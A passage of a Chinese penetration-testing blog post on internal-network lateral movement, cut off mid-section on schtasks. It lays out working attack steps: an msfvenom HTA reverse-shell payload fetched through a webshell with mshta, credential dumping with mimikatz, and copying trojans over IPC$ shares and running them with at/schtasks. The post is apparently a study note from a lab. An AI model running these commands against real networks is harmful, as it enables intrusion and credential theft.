<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>0x28 - 内网横向移动 | 晚上十一点睡觉</title><meta name="keywords" content="横向移动"><meta name="author" content="晚上十一点睡觉"><meta name="copyright" content="晚上十一点睡觉"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="横向移动简介当攻击者在拿下一台内网主机后，通常会利用当前拿下的机器当作跳板，进一步攻击内网其他主机，扩大攻击影响范围。 工作组内横向移动和在外网渗透很相似 域内横向移动的话就需要寻找到域内的相应用户、域控， 最直接的拿到权限方法就是获取哈希或者用户凭证，最直接拿到域控权限的方法，再就是得到了域内一个主机的账户密码就可以尝试对域内其他的主机账户尝试登录。只要在你的机器上登录过域控，就有可能从你的机器">
<meta property="og:type" content="article">
<meta property="og:title" content="0x28 - 内网横向移动">
<meta property="og:url" content="http://example.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/0x28-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.html">
<meta property="og:site_name" content="晚上十一点睡觉">
<meta property="og:description" content="横向移动简介当攻击者在拿下一台内网主机后，通常会利用当前拿下的机器当作跳板，进一步攻击内网其他主机，扩大攻击影响范围。 工作组内横向移动和在外网渗透很相似 域内横向移动的话就需要寻找到域内的相应用户、域控， 最直接的拿到权限方法就是获取哈希或者用户凭证，最直接拿到域控权限的方法，再就是得到了域内一个主机的账户密码就可以尝试对域内其他的主机账户尝试登录。只要在你的机器上登录过域控，就有可能从你的机器">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237529.png">
<meta property="article:published_time" content="2022-08-20T17:38:34.000Z">
<meta property="article:modified_time" content="2022-08-20T17:38:34.000Z">
<meta property="article:author" content="晚上十一点睡觉">
<meta property="article:tag" content="横向移动">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237529.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/0x28-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":150,"languages":{"author":"作者: 晚上十一点睡觉","link":"链接: ","source":"来源: 晚上十一点睡觉","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '0x28 - 内网横向移动',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-08-21 01:38:34'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208151640204.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">87</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">43</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">38</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237529.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">晚上十一点睡觉</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">0x28 - 内网横向移动</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-08-20T17:38:34.000Z" title="发表于 2022-08-21 01:38:34">2022-08-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-08-20T17:38:34.000Z" title="更新于 2022-08-21 01:38:34">2022-08-21</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/">内网</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">横向移动</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">9.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>35分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="0x28 - 内网横向移动"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/0x28-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.html#post-comment"><span id="twikoo-count"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="横向移动简介"><a href="#横向移动简介" class="headerlink" title="横向移动简介"></a>横向移动简介</h1><p>当攻击者在拿下一台内网主机后，通常会利用当前拿下的机器当作跳板，进一步攻击内网其他主机，扩大攻击影响范围。</p>
<p>工作组内横向移动和在外网渗透很相似</p>
<p>域内横向移动的话就需要寻找到域内的相应用户、域控， 最直接的拿到权限方法就是获取哈希或者用户凭证，最直接拿到域控权限的方法，再就是得到了域内一个主机的账户密码就可以尝试对域内其他的主机账户尝试登录。只要在你的机器上登录过域控，就有可能从你的机器中拿到域控的凭证登录域控。再或者就是内网弱口令也很多，这种弱口令一拿就是一大批，扩大攻击范围。</p>
<p>我们内网渗透过程中，首先使用Windows内置的工具，如果不满足需求就再上传外部工具进行渗透</p>
<h1 id="获得权限"><a href="#获得权限" class="headerlink" title="获得权限"></a>获得权限</h1><p>也就是拿到一台进入内网的入口,信息收集发现weblogic资产</p>
<ul>
<li>扫描：</li>
</ul>
<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208112055209.png" alt="image-20220811205540863" style="zoom: 33%;" />

<ul>
<li>利用weblogic历史漏洞：利用脚本写入webshell</li>
</ul>
<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208112057659.png" alt="image-20220811205716568" style="zoom:50%;" />

<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208112058391.png" alt="image-20220811205828304" style="zoom:50%;" />

<ul>
<li>利用小马传大马：MSF生成HTA反弹shell</li>
</ul>
<p>传hta弹shell，可以远程下载hta，无文件落地上线msf（优点）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.58.133 lport=4002 -f hta-psh -o 4002.hta</span><br><span class="line"></span><br><span class="line">-f hta-psh		以hta格式输出</span><br><span class="line"></span><br><span class="line">并开启msf监听：</span><br></pre></td></tr></table></figure>

<ul>
<li>通过WEB漏洞反弹shell</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">（内置）mshta远程下载hta文件执行</span><br><span class="line">并在vps开启一个web服务供下载hta文件（python3 -m http.server）</span><br><span class="line">http://1xx.xx.xx.95:7001/bea_wls_internal/demo.jsp?pwd=admin&amp;cmd=cmd /c mshta http://1xx.xx.xx.91:8000/6666.hta</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cmd /c mshta http://1xx.xx.xx.91:8000/6666.hta	</span><br><span class="line">以非交互式方式执行命令</span><br></pre></td></tr></table></figure>

<ul>
<li><p>得到MSF会话，在meterpreter中，可以通过run命令记载Post\后渗透模块进行使用。</p>
</li>
<li><p>获取账号密码</p>
</li>
</ul>
<p><strong>mimikatz能从lsass.exe文件中读取密码，因为只要某个用户登录过，其密码就会记录在lsass.exe进程中，只要其没有重启或者关机，密码都会记录在lsass.exe进程之中</strong></p>
<p><strong>这种记录密码的特性为我们域内渗透提供了一种新的思路：</strong></p>
<p><strong>如果域提权不了，拿不到域控，我们便可以通过下面获取账号密码的方式可以获取其他用户的账户和密码</strong></p>
<p><strong>那么我们就可以从获取的其他用户账户密码入手继续登录其他主机，再在其机器上查找有无域控账户的登录痕迹，如果域控登陆过这台机器，就会有域控的账户密码，籍此方法间接获取域控的权限</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashdump</span><br></pre></td></tr></table></figure>

<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208051846777.png" alt="image-20220805184648622" style="zoom:50%;" />

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在msf中有集成mimikatz的模块</span><br><span class="line">load kiwi		加载内置的mimikatz</span><br><span class="line">加载完模块后，可以通过help查看加载的模块的用法</span><br><span class="line">getsystem		先提升权限，获取system权限</span><br><span class="line">creds_all		获取所有凭证</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">web\administrator   1qaz@WSX</span><br></pre></td></tr></table></figure>

<ul>
<li>登录验证（验证拿到的账号密码能否进行登录）</li>
</ul>
<p>通过了两个工具，一个是crackmapexec，一个是smbclient</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crackmapexec：对目标主机smb协议以及默认文件共享进行一枚举，通过我们提供的账户密码获取其文件共享</span><br><span class="line">crackmapexec smb 192.168.10.112 -u &#x27;WEB\administrator&#x27; -p &#x27;1qaz@WSX&#x27; --shares</span><br><span class="line">用GUNGNIR域控管理员的账户密码：	</span><br><span class="line">crackmapexec smb 192.168.10.112 -u &#x27;administrator&#x27; -p &#x27;1qaz@WSX3&#x27; --shares</span><br><span class="line"></span><br><span class="line">smbclient：利用账户密码，提供smb服务登录到其系统，就相当于拿到了一个命令行终端</span><br><span class="line">smbclient //192.168.10.112/C$ -U &#x27;WEB\administrator%1qaz@WSX&#x27;</span><br><span class="line">输入help即可查看可以使用的命令</span><br></pre></td></tr></table></figure>

<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208120911337.png" alt="image-20220812091111949"></p>
<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208051847741.png" alt="image-20220805184747362" style="zoom:50%;" />

<h2 id="补充知识："><a href="#补充知识：" class="headerlink" title="补充知识："></a>补充知识：</h2><blockquote>
<ul>
<li>cs中meterpreter中的shell的本质，就是在目标主机起一个cmd.exe</li>
<li>H:\ATTACK\权限提升\SysinternalsSuite目录中有Sysinternal工具</li>
</ul>
<p>Sysinternal是微软官方开发的一些工具套件，可以使用这些工具去分析系统的一些进程啊什么的</p>
<p>可以使用文件夹中的procexp64.exe来分析进程</p>
</blockquote>
<ul>
<li>内网主机存活探测(尝试找出域控ip)</li>
</ul>
<p>如何寻找域控呢？</p>
<ol>
<li>下面工具的功能，类似内网<code>arp -a</code>查看各个网段有哪些IP主机存活,并尝试判断域控是哪个</li>
</ol>
<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208121520690.png" alt="image-20220812152048429" style="zoom: 50%;" />

<ol start="2">
<li><code>ipconfig -all</code>查找本机的DNS服务器，一般是域控在提供DNS解析</li>
</ol>
<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208130005835.png" alt="image-20220813000513503" style="zoom:50%;" />

<p>3.直接ping 域名，如<code>ping gungnir.top</code></p>
<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208130006771.png" alt="image-20220813000617610" style="zoom:50%;" />

<ol start="4">
<li>扫描发现：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nbscan.exe -m 10.10.10.0/24</span><br><span class="line">arp-scan.exe -t 10.10.10.0/24</span><br></pre></td></tr></table></figure>

<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208051848699.png" alt="image-20220805184808384" style="zoom: 33%;" />

<h1 id="横向移动-内置工具篇"><a href="#横向移动-内置工具篇" class="headerlink" title="横向移动-内置工具篇"></a>横向移动-内置工具篇</h1><h2 id="IPC"><a href="#IPC" class="headerlink" title="IPC$"></a>IPC$</h2><h3 id="IPC-简介"><a href="#IPC-简介" class="headerlink" title="IPC$  简介"></a>IPC$  简介</h3><p>IPC$  (Internet Process Connection) 是<strong>共享”命名管道”<strong>的资源，它是为了</strong>让进程间通信而开放的命名管道</strong>，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。当然也可以关闭<br>利用 IPC$ ，连接者与目标主机利用建立的连接可以得到目标主机上的<strong>目录结构、用户列表</strong>等信息。</p>
<h3 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h3><ul>
<li>开放了 139 、 445 端口；</li>
</ul>
<p>IPC$  连接可以实现<strong>远程登陆及对默认共享</strong>的访问，而 <strong>139 端口的开启表示 netbios</strong>  协议的应用。445是smb服务<br>我们可以通过 139 和 445 端口来实现对共享文件&#x2F;打印机的访问，因此一般来讲， IPC$ 连接是需要 139或 445 端口来支持的。<br>IPC$  连接默认会走 445 端口，不通的话则会走 139 端口，这两个端口都可以单独实现文件共享</p>
<p>一般Windows会有默认共享，也就是意味着会开发这些端口</p>
<ul>
<li>目标开启 IPC$  <strong>文件共享服务</strong>及<strong>默认共享</strong></li>
</ul>
<p>默认共享是<strong>为了方便管理员远程管理</strong>而默认开启的共享。<br>所有逻辑磁盘（ c$、d$、e$ …）和系统目录 WINNT  或 WINDOWS（ADMIN$） ，通过IPC连接可以实现对这些默认共享的访问。具备管理员权限即可去实现相应的功能</p>
<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208051850244.png" alt="image-20220805185059115" style="zoom:50%;" />

<ul>
<li>需要目标机器的<strong>管理员账号和密码</strong></li>
</ul>
<p>域内：默认情况下只有被添加到远程计算机<strong>管理员组的域用户（域管用户）</strong>有权限对 <strong>admin$</strong>  目录建立 IPC  连接</p>
<p>工作组内：<strong>本地的 Administrator  用户</strong>也可以，但是默认情况下该用户是被禁用的，如果启用了该用户，那么也可以使用 Administrator  用户远程连接</p>
<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p>这些命令不要死记硬背，只要我们本地用什么命令，如何加上个<code>\\10.10.10.10\</code>即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 连接</span><br><span class="line">net use \\10.10.10.10\ipc$ /user:PC\administrator &quot;1qaz@WSX3e&quot;</span><br><span class="line">net use \\10.10.10.10\ipc$ /user:GUNGNIR\administrator &quot;1qaz@WSX3&quot;</span><br><span class="line">2. 查看连接情况</span><br><span class="line">net use</span><br><span class="line">3. 查看目标主机时间</span><br><span class="line">net time \\10.10.10.10</span><br><span class="line">net  time 默认查看本机时间</span><br><span class="line">4. 查看C盘文件</span><br><span class="line">dir \\10.10.10.10\c$</span><br></pre></td></tr></table></figure>

<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208051854255.png" alt="image-20220805185438016" style="zoom: 50%;" />

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4. 删除连接</span><br><span class="line">net use \\10.10.10.201\ipc$ /del </span><br><span class="line">net use * /del /y</span><br></pre></td></tr></table></figure>

<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208051855893.png" alt="image-20220805185501722" style="zoom:50%;" />

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5. 文件上传下载</span><br><span class="line">copy shell.exe \\10.10.10.201\c$\windows\temp\plugin_update.exe   </span><br><span class="line">copy \\10.10.10.201 \c$\59.exe c:\</span><br><span class="line">6. 查看目标主机文件</span><br><span class="line">dir \\10.10.10.201\c$</span><br><span class="line">7. 开放/关闭 ipc$ 共享。</span><br><span class="line">net share ipc$</span><br><span class="line">net share ipc$ /del</span><br><span class="line">8. 共享计算机 C 盘。</span><br><span class="line">net share C=c:\</span><br><span class="line">9. 映射共享磁盘到本地。将目标的C盘挂载到本地的z盘下（原本没有z盘）</span><br><span class="line">net use z: \\10.10.10.10\c$ </span><br><span class="line">10. 查看/删除共享的资源。</span><br><span class="line">net share</span><br><span class="line">net share C /del</span><br><span class="line">11. 取消IPC远程连接。</span><br><span class="line">net use c: /del</span><br><span class="line">net use * /del /y</span><br></pre></td></tr></table></figure>

<p>挂在目标机器的磁盘效果图：</p>
<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208130022829.png" alt="image-20220813002211620" style="zoom:50%;" />



<h3 id="IPC-连接失败常见错误号"><a href="#IPC-连接失败常见错误号" class="headerlink" title="IPC$连接失败常见错误号"></a>IPC$连接失败常见错误号</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一定要注意防火墙问题！！！！大部分内网机器都可能开了防火墙</span><br><span class="line"></span><br><span class="line">错误号 5，拒绝访问                      【很可能你使用的用户不是管理员权限，先提升权限】</span><br><span class="line">错误号 51，Windows 无法找到网络路径     【网络有问题】</span><br><span class="line">错误号 53，找不到网络路径               【ip 地址错误；目标未开机；目标 lanmanserver 服务未启动；目标有防火墙（端口过滤）】</span><br><span class="line">错误号 67，找不到网络名                 【你的 lanmanworkstation 服务未启动；目标删除了 ipc$；】</span><br><span class="line">错误号 1219，提供的凭据与已存在的凭据集冲突     【你已经和对方建立了一个ipc$，请删除后再连】</span><br><span class="line">错误号 1326，未知的用户名或错误密码             【用户名或密码错误】</span><br><span class="line">错误号 1385，登录失败：未授予用户在此计算机上的请求登录类型</span><br><span class="line">错误号 1792，试图登录，但是网络登录服务没有启动     【目标NetLogon服务未启动[连接域控会出现此情况]】</span><br><span class="line">错误号 2242，此用户的密码已经过期                   【目标有帐号策略，强制定期要求更改密码】</span><br></pre></td></tr></table></figure>

<h2 id="IPC-AT-x2F-Schtasks"><a href="#IPC-AT-x2F-Schtasks" class="headerlink" title="IPC+AT&#x2F;Schtasks"></a>IPC+AT&#x2F;Schtasks</h2><ul>
<li>ipc 结合定时任务实现执行上传的文件 得到权限的过程 。主要是因为本地开启一个进程可以用<code>start a.exe</code> 但是通过net建立连接的远程主机是不支持start远程开启进程。所以我们才需要依赖定时任务</li>
<li>at&#x2F;schtasks都是定时任务，后面几个版本淘汰了at</li>
<li>打开计划任务的命令是<code>Taskschd.msc</code></li>
</ul>
<h3 id="AT简介"><a href="#AT简介" class="headerlink" title="AT简介"></a>AT简介</h3><p>AT命令可在指定时间和日期、在指定计算机上运行命令和程序。</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/troubleshoot/windows-client/system-management-components/use-at-command-to-schedule-tasks">https://docs.microsoft.com/zh-cn/troubleshoot/windows-client/system-management-components/use-at-command-to-schedule-tasks</a></p>
</blockquote>
<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">建立IPC连接：</span><br><span class="line">net use \\10.10.10.30\c$ /user:pc\administrator &quot;1qaz@WSX&quot;</span><br><span class="line"></span><br><span class="line">上传木马文件59.exe：</span><br><span class="line">copy 59.exe \\10.10.10.30\c$</span><br><span class="line"></span><br><span class="line">查看远程主机时间：</span><br><span class="line">net time \\10.10.10.30</span><br><span class="line"></span><br><span class="line">AT命令添加任务：(注意执行可执行程序要带绝对路径，并且双斜杠)</span><br><span class="line">at \\10.10.10.30 19:08 c:\\59.exe</span><br><span class="line">at \\10.10.10.30 19:08 calc.exe	这样执行不会有回显啊什么的 但是确切的会执行程序</span><br><span class="line"></span><br><span class="line">AT命令删除任务：</span><br><span class="line">at \\10.10.10.30 1 /delete</span><br><span class="line"></span><br><span class="line">AT命令查看任务：</span><br><span class="line">at \\10.10.10.30   #查看at任务列表，已经执行了的，不会显示。</span><br></pre></td></tr></table></figure>

<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208051859950.png" alt="image-20220805185712800"></p>
<p>注意：</p>
<blockquote>
<p>问题：执行at命令时，显示绑定句柄无效。<br>解决：echo 10.10.11.100 RemoteHost &gt; C:\Windows\System32\drivers\etc\hosts<br>AT命令在windows server 2012等新版系统中已被弃用<br>AT命令如果找不到网络路径，则判断是目标主机已禁用 Task Scheduler服务</p>
</blockquote>
<h3 id="Schtasks简介"><a href="#Schtasks简介" class="headerlink" title="Schtasks简介"></a>Schtasks简介</h3><p>由于 AT 在 windows server 2012 等新版系统中已被弃用，所以需要使用 schtasks  命令代替。</p>
<blockquote>
<p>允许管理员创建、删除、查询、更改、运行和中止本地或远程系统上的计划任务</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/Create     创建新计划任务。</span><br><span class="line">/Delete     删除计划任务。</span><br><span class="line">/Query      显示所有计划任务。</span><br><span class="line">/Change     更改计划任务属性。</span><br><span class="line">/Run        按需运行计划任务。</span><br><span class="line">/End        中止当前正在运行的计划任务。</span><br><span class="line">/ShowSid    显示与计划的任务名称相应的安全标识符。</span><br><span class="line">/?          显示此帮助消息。</span><br></pre></td></tr></table></figure>

<blockquote>
<p>更多请参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_39680564/article/details/88993633">https://blog.csdn.net/qq_39680564/article/details/88993633</a></p>
</blockquote>
<h4 id="命令格式"><a href="#命令格式" class="headerlink" title="命令格式"></a>命令格式</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#创建任务</span><br><span class="line">schtasks /create /tn task1 /U 域\域用户 /P 域用户密码 /tr 命令 /sc ONSTART /s 域机器ip /RU system</span><br><span class="line">#运行任务</span><br><span class="line">schtasks /run /tn task1 /s 192.168.10.2 /U 域/域用户 /P 域用户密码</span><br><span class="line">#删除任务</span><br><span class="line">schtasks /F /delete /tn task1 /s 域机器ip /U 域\域用户 /p 域用户密码</span><br><span class="line"></span><br><span class="line">#具体细项的意义：</span><br><span class="line">schtasks /create             创建新的计划任务。</span><br><span class="line">         /sc schedule        指定计划类型。有效值为 MINUTE、HOURLY、DAILY、WEEKLY、MONTHLY、ONCE、ONSTART、ONLOGON、ONIDLE。</span><br><span class="line">         /mo modifier        指定任务在其计划类型内的运行频率。这个参数对于 MONTHLY 计划是必需的。对于 